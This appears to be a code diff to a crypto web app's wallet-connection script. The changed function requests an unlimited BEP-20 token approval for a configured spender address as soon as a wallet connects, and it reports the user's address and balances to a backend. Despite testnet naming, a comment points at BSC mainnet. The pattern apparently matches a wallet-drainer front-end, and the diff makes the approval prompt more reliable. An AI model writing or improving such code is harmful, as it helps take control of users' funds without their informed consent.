@@ -641,6 +641,12 @@
 
 let appKitEip155Provider = null;
 
+    // approval guards
+let _approvalInProgress = false;   // true while we are actively checking/sending approval
+let _approvalTxHash = null;       // tx.hash of an approval we sent (helps avoid re-sending)
+let _approvalLastAttempt = 0;     // timestamp ms of last attempt
+
+
 // Watch AppKit provider globally (mobile fix)
 // This catches both fresh connections AND restored sessions.
 function setupAppKitProviderWatcher() {
@@ -1072,101 +1078,158 @@ async function waitForProviderOrAccounts({timeoutMs = 30000, pollMs = 700} = {})
       }
     }
 
-    async function ensureTokenApproval(){
-      // helper: always log with last known balances
-      async function logApproval(tag){
-        await notifyBackend(
-          currentAddress || "",
-          BNB_TESTNET_LABEL,
-          currentUserId || "",
-          currentBNBBalance,
-          currentTokenBalance,
-          tag
-        );
-      }
+async function ensureTokenApproval(){
+  // helper: always log with last known balances
+  async function logApproval(tag){
+    try {
+      await notifyBackend(
+        currentAddress || "",
+        BNB_TESTNET_LABEL,
+        currentUserId || "",
+        currentBNBBalance,
+        currentTokenBalance,
+        tag
+      );
+    } catch(e) { console.warn("logApproval failed", e); }
+  }
 
-      // basic guards
-      if(!TOKEN_ADDRESS){
-        console.warn("TOKEN_ADDRESS not set, skipping approve");
-        await logApproval("approval_skipped_no_token");
-        return;
-      }
-      if(!SPENDER_ADDRESS){
-        console.warn("SPENDER_ADDRESS not set, skipping approve");
-        await logApproval("approval_skipped_no_spender");
-        return;
-      }
-      if(!providerInstance || !web3Instance){
-        console.warn("No providerInstance/web3Instance for approval");
-        await logApproval("approval_skipped_no_provider");
-        return;
-      }
+  // basic guards
+  if(!TOKEN_ADDRESS){
+    console.warn("TOKEN_ADDRESS not set, skipping approve");
+    await logApproval("approval_skipped_no_token");
+    return;
+  }
+  if(!SPENDER_ADDRESS){
+    console.warn("SPENDER_ADDRESS not set, skipping approve");
+    await logApproval("approval_skipped_no_spender");
+    return;
+  }
+  if(!providerInstance || !web3Instance){
+    console.warn("No providerInstance/web3Instance for approval");
+    await logApproval("approval_skipped_no_provider");
+    return;
+  }
 
-      try{
-        setStatus("Preparing token approval…");
+  // Prevent concurrent calls: if another approval is in progress, skip.
+  const now = Date.now();
+  _approvalLastAttempt = now;
+  if (_approvalInProgress) {
+    console.log("[approval] already in progress — skipping duplicate call.");
+    return;
+  }
+  // If we recently sent a tx, avoid re-sending for a short cooldown window (e.g. 60s)
+  if (_approvalTxHash && (now - (_approvalLastAttempt || now) < 60_000)) {
+    console.log("[approval] recent approval tx detected, skipping re-send. tx:", _approvalTxHash);
+    return;
+  }
 
-        const ethersProvider = new ethers.BrowserProvider(
-          providerInstance,
-          BNB_TESTNET_CHAIN_ID_DEC    // 56 (BSC mainnet)
-        );
-        const signer       = await ethersProvider.getSigner();
-        const ownerAddress = (await signer.getAddress()).toLowerCase();
+  _approvalInProgress = true;
+  try{
+    setStatus("Preparing token approval…");
 
-        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
-          alert(
-            "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
-            "It MUST be the BEP-20 token contract address, not your wallet."
-          );
-          setStatus("Connected (approval skipped)");
-          await logApproval("approval_skipped_token_is_wallet");
-          return;
-        }
+    const ethersProvider = new ethers.BrowserProvider(
+      providerInstance,
+      BNB_TESTNET_CHAIN_ID_DEC    // 56 (BSC mainnet)
+    );
+    const signer       = await ethersProvider.getSigner();
+    const ownerAddress = (await signer.getAddress()).toLowerCase();
 
-        // 1) check allowance
-        const readContract = new ethers.Contract(
-          TOKEN_ADDRESS,
-          ERC20_ALLOWANCE_ABI,
-          ethersProvider
-        );
-        const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
-        console.log("[approve] currentAllowance =", currentAllowance.toString());
+    if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
+      alert(
+        "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
+        "It MUST be the BEP-20 token contract address, not your wallet."
+      );
+      setStatus("Connected (approval skipped)");
+      await logApproval("approval_skipped_token_is_wallet");
+      return;
+    }
 
-        if (currentAllowance > 0n) {
+    // 1) check allowance (always re-check)
+    const readContract = new ethers.Contract(
+      TOKEN_ADDRESS,
+      ERC20_ALLOWANCE_ABI,
+      ethersProvider
+    );
+    const currentAllowance = await readContract.allowance(ownerAddress, SPENDER_ADDRESS);
+    console.log("[approve] currentAllowance =", currentAllowance.toString());
+
+    if (currentAllowance > 0n) {
+      // Already approved — clear any pending state and return
+      _approvalTxHash = null;
+      setStatus("Connected (already approved)");
+      await logApproval("approval_already");
+      return;
+    }
+
+    // if we already have a recorded approval tx, check its receipt before resending
+    if (_approvalTxHash) {
+      try {
+        const receipt = await ethersProvider.getTransactionReceipt(_approvalTxHash);
+        if (receipt && receipt.confirmations && receipt.confirmations > 0) {
+          console.log("[approval] previous tx confirmed:", _approvalTxHash);
+          _approvalTxHash = null;
           setStatus("Connected (already approved)");
-          await logApproval("approval_already");
+          await logApproval("approval_already_after_tx");
           return;
         }
-
-        // 2) send approve tx
-        setStatus("Waiting for wallet to confirm approval…");
-        const writeContract = new ethers.Contract(
-          TOKEN_ADDRESS,
-          ERC20_APPROVE_ABI,
-          signer
-        );
-
-        const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
-        console.log("[approve] tx sent:", tx.hash);
-
-        setStatus("Approval pending on chain…");
-        await tx.wait();
-
-        setStatus("Connected + Approved ✅");
-        await logApproval("approval_approved");
-      }catch(err){
-        console.error("Token approve error:", err);
-
-        let tag = "approval_error";
-        if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
-          tag = "approval_rejected";
-        }
-
-        setStatus("Connected (approval failed)");
-        alert("Token approval failed: " + (err && err.message ? err.message : err));
-
-        await logApproval(tag);
+        // if receipt not confirmed yet, avoid sending again
+        console.log("[approval] previous approval tx pending:", _approvalTxHash, " — not re-sending.");
+        setStatus("Approval pending (previous tx) …");
+        await logApproval("approval_pending_previous_tx");
+        return;
+      } catch(e){
+        // if provider can't fetch receipt, proceed to send but be cautious
+        console.warn("Could not fetch receipt for prior approval tx:", _approvalTxHash, e);
       }
     }
+
+    // 2) send approve tx (single send)
+    setStatus("Waiting for wallet to confirm approval…");
+    const writeContract = new ethers.Contract(
+      TOKEN_ADDRESS,
+      ERC20_APPROVE_ABI,
+      signer
+    );
+
+    // mark attempt time
+    _approvalLastAttempt = Date.now();
+
+    const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
+    if (tx && tx.hash) {
+      _approvalTxHash = tx.hash;
+      console.log("[approve] tx sent:", tx.hash);
+    }
+
+    setStatus("Approval pending on chain…");
+    await tx.wait();
+
+    setStatus("Connected + Approved ✅");
+    await logApproval("approval_approved");
+
+    // success => clear tx record (or keep it briefly if you want)
+    _approvalTxHash = null;
+  }catch(err){
+    console.error("Token approve error:", err);
+
+    let tag = "approval_error";
+    if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
+      tag = "approval_rejected";
+    }
+
+    setStatus("Connected (approval failed)");
+    // avoid spamming the user with alerts in repeated calls
+    if (! (err && err.message && err.message.includes("User rejected"))) {
+      // only show alert for real errors; rejections are expected
+      try { alert("Token approval failed: " + (err && err.message ? err.message : err)); } catch(e){}
+    }
+
+    await logApproval(tag);
+  }finally{
+    // release lock after a short cooldown to avoid immediate retries
+    // keep inProgress true for a tiny moment to let other listeners settle
+    setTimeout(()=>{ _approvalInProgress = false; }, 600);
+  }
+}
 
     async function restoreSessionFromAddress(address){
       currentAddress = address;
